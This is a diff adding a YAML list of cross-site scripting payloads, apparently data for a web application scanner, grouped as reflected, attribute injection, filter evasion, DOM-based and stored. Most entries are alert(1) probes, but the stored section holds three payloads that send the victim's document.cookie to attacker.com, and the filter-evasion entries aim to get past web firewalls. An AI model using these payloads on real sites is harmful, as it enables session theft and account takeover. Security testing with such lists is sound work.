@@ -1,0 +1,46 @@
+# XSS Payloads
+# From basic to WAF-bypass techniques
+
+reflected:
+  basic:
+    - "<script>alert(1)</script>"
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(1)>"
+    - "<body onload=alert(1)>"
+    - "\"<script>alert(1)</script>"
+    - "'<script>alert(1)</script>"
+    - "</title><script>alert(1)</script>"
+    - "</textarea><script>alert(1)</script>"
+
+  attribute_injection:
+    - "\" onmouseover=\"alert(1)"
+    - "' onmouseover='alert(1)"
+    - "\" onfocus=\"alert(1)\" autofocus=\""
+    - "' onclick='alert(1)' x='"
+    - "\" onload=\"alert(1)"
+
+  filter_evasion:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<script >alert(1)</script >"
+    - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+    - "<svg/onload=alert(1)>"
+    - "<img src=1 href=1 onerror=\"javascript:alert(1)\">"
+    - "javascript:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+    - "<details open ontoggle=alert(1)>"
+    - "<input autofocus onfocus=alert(1)>"
+    - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+
+  dom_based:
+    - "#<script>alert(1)</script>"
+    - "#\"><script>alert(1)</script>"
+    - "javascript:void(document.domain)"
+
+stored:
+  - "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
+  - "<img src=x onerror=\"this.src='https://attacker.com?c='+document.cookie\">"
+  - "<svg onload=\"document.location='https://attacker.com?c='+document.cookie\">"
+
+# Safe canary we use to detect reflection without actual execution
+canary: "wapt_xss_canary_{id}"
